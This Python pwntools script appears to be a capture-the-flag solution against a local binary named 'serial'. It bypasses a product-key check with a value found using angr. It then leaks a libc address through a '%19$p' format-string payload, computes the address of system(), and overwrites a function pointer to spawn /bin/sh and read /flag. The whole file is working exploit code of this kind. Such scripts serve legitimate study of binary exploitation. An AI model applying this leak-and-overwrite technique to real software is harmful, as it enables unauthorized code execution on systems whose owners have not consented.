#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./serial"

rhp = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

printf_plt = binf.plt["printf"]
offset_libc_start_main = libc.functions["__libc_start_main"].address
offset_system = libc.functions["system"].address

#preparatory investigation
stack_ix = 19               #the index of the stack which refers to libcstartmain
product_key = 615066814080  #acquired with angr

def exploit(conn):

  #pass auth
  conn.recvuntil("input product key: ")
  conn.sendline(str(product_key))

  #leak __libc_start_main+239
  payload = "%19$p"
  payload += "A"*(0x18-len(payload))
  payload += p64(printf_plt)
  conn.recvuntil("choice >> ")
  conn.sendline("1")
  conn.recvuntil("insert >> ")
  conn.sendline(payload)
  conn.recvuntil("choice >> ")
  conn.sendline("3")
  conn.recvuntil("func :")
  conn.recvline()
  libc_start_main231 = int(conn.recvline()[2:14],16)
  
  #calc libc_base and addr of system()
  libc_start_main = libc_start_main231 - 231
  libc_base = libc_start_main - offset_libc_start_main
  addr_system = libc_base + offset_system
  print("libc_start_main: "+hex(libc_start_main))
  print("libc_base      : "+hex(libc_base))

  #clear the entry
  conn.recvuntil("choice >> ")
  conn.sendline("2")
  conn.recvuntil("choice>> ")
  conn.sendline("0")
  
  #inject payload
  payload = "/bin/sh;"
  payload += " "*(0x18-len(payload))
  payload += p64(addr_system)
  conn.recvuntil("choice >> ")
  conn.sendline("1")
  conn.recvuntil("insert >> ")
  conn.sendline(payload)

  #run
  conn.recvuntil("choice >> ")
  conn.sendline("3")

  #get the flag
  conn.recvline()
  conn.sendline("cat /flag")

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
      b *0x400e93
      c
    """
    #0x400e93: main
    #0x400cbb: read_til_line
    conn = gdb.debug(FILENAME,cmd)
else:
    conn = remote(rhp['host'],rhp['port'])
exploit(conn)
conn.interactive()

